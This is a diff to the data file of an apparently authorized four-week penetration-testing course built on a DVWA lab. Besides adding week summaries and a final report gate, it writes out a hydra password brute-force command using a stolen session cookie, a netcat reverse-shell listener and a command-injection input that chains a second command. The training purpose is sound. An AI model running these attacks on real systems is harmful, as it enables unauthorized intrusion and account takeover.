@@ -7,35 +7,40 @@ export const WEEKS: Record<number, Week> = {
     title: 'Lab Setup & Rules of Engagement',
     theme: 'Stand up your environment and agree the rules before any testing',
     objective: 'Get your tools running, reach your targets, and confirm authorized scope',
-    runs: 'Run 00'
+    runs: 'Run 00',
+    plain: 'Setup week: build your little lab and agree the rules before touching anything. Like a locksmith signing a contract and laying out their tools before going near a door — permission first, then work.'
   },
   1: {
     number: 1,
     title: 'Cold Recon',
     theme: 'Build, connect, passive recon, baseline hardening',
     objective: 'Establish baseline, passive reconnaissance, and foundational security controls',
-    runs: 'Run 01'
+    runs: 'Run 01',
+    plain: 'Quietly learn everything you can about the target from the outside, and lock down the obvious weak spots first — like casing a building and bolting the easy doors before anyone tries them.'
   },
   2: {
     number: 2,
     title: 'Hard Target',
     theme: 'Authorized vulnerability assessment + SOC detection engineering',
     objective: 'Perform vulnerability discovery and detection engineering',
-    runs: 'Run 02'
+    runs: 'Run 02',
+    plain: 'Now actively hunt for the weak spots — and on the defence side, wire up the alarms that should notice someone poking at them. Attack and detection, built side by side.'
   },
   3: {
     number: 3,
     title: 'The Breach',
     theme: 'Attack, detect, investigate, preserve evidence',
     objective: 'Execute authorized attacks and investigate findings',
-    runs: 'Run 03'
+    runs: 'Run 03',
+    plain: 'The staged break-in: attackers exploit a weakness while defenders detect it and preserve the proof — hashed and logged like a real case, not just "we saw something".'
   },
   4: {
     number: 4,
     title: 'Payday',
     theme: 'Report and present findings',
     objective: 'Compile and present final findings and recommendations',
-    runs: 'Run 04'
+    runs: 'Run 04',
+    plain: 'Turn everything into the report and briefing a client pays for: what you found, how bad it is, and exactly what to fix — in words a non-technical manager can act on.'
   }
 };
 
@@ -79,6 +84,19 @@ export const GATES: Gate[] = [
       { from: 'grc', to: 'blue', artifact: 'IR_Runbook.md', label: 'Issue the incident-response runbook Blue follows during the breach' },
       { from: 'red', to: 'grc', artifact: 'Evidence_Photos.zip', label: 'Submit attack evidence for chain of custody' },
       { from: 'blue', to: 'grc', artifact: 'Incident_Response.txt', label: 'Submit IR notes and logs for custody' },
+    ],
+  },
+  {
+    id: 4,
+    week: 4,
+    title: 'Gate 4',
+    description: 'Final report & briefing delivered',
+    requiredArtifactTypes: ['final_report'],
+    requiredTasks: ['red-w4-briefing', 'blue-w4-response', 'grc-w4-report'],
+    handoffs: [
+      { from: 'red', to: 'grc', artifact: 'Attack_Briefing.md', label: 'Hand the attacker’s story to GRC for the final report' },
+      { from: 'blue', to: 'grc', artifact: 'Defense_Summary.md', label: 'Hand the detection & response summary to GRC' },
+      { from: 'grc', to: 'grc', artifact: '08_Final_Report_and_Briefing.md', label: 'GRC compiles everything into the final report & client briefing' },
     ],
   }
 ];
@@ -409,6 +427,8 @@ const RED_TASKS: Task[] = [
         instruction: 'Target the DVWA "Brute Force" lab page — NOT the main login. login.php has a per-request anti-CSRF user_token that hydra cannot submit, so a password it "finds" there will NOT actually log you in. The Brute Force page has no such token on Low. You must be LOGGED IN first: in the browser log into DVWA, set Security = Low, then copy your PHPSESSID cookie (DevTools → Application → Cookies) and paste it into the command below.',
         commands: [
           { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
+          { cmd: 'sudo apt-get install -y wordlists', explain: 'Install the wordlists package (ships the rockyou password list). Safe to run if already installed.' },
+          { cmd: '[ -f /usr/share/wordlists/rockyou.txt ] || sudo gunzip /usr/share/wordlists/rockyou.txt.gz', explain: 'Unzip rockyou the first time only — this line does nothing if it is already unzipped.' },
           {
             cmd: 'sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt <YOUR_TARGET_IP> -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\: PHPSESSID=<your_session_id>; security=low:F=Username and/or password incorrect" | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt',
             explain: 'Kali terminal: try every rockyou password for admin against the DVWA Brute Force page. It sends your logged-in cookie so the page answers, and keeps going until the "incorrect" failure text disappears. Replace <your_session_id> with your PHPSESSID.',
@@ -431,7 +451,7 @@ const RED_TASKS: Task[] = [
         frameworks: ['CIS', 'OWASP'],
         files: [
           { name: 'hydra', purpose: 'the login brute-forcer (pre-installed on Kali)', source: 'sudo apt install -y hydra' },
-          { name: 'rockyou.txt wordlist', purpose: 'the password list hydra tries — ships gzipped on Kali, so unzip it first', source: 'sudo gunzip /usr/share/wordlists/rockyou.txt.gz' },
+          { name: 'rockyou.txt wordlist', purpose: 'the password list hydra tries — the install + unzip commands above put it in place' },
           { name: 'Your DVWA PHPSESSID cookie', purpose: 'hydra must send your logged-in session; copy it from DevTools → Application → Cookies' },
         ],
         producesDeliverable: 'Brute_Force_Proof.txt',
@@ -448,7 +468,7 @@ const RED_TASKS: Task[] = [
           { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
           {
             cmd: 'nc -lvnp 4444',
-            explain: '① KALI TERMINAL: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
+            explain: '① KALI VM terminal: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
             flags: [
               { flag: 'nc', meaning: 'Netcat — raw TCP connections.' },
               { flag: '-l', meaning: 'Listen mode (wait for a connection).' },
@@ -459,7 +479,7 @@ const RED_TASKS: Task[] = [
           },
           {
             cmd: '127.0.0.1; which nc bash python3 php',
-            explain: '② BROWSER field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.',
+            explain: '② In the browser, go to the DVWA Command Injection input field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.',
             flags: [
               { flag: 'which nc bash python3 php', meaning: 'Shows the path of each tool that exists in the container (a blank line = not installed).' },
             ],
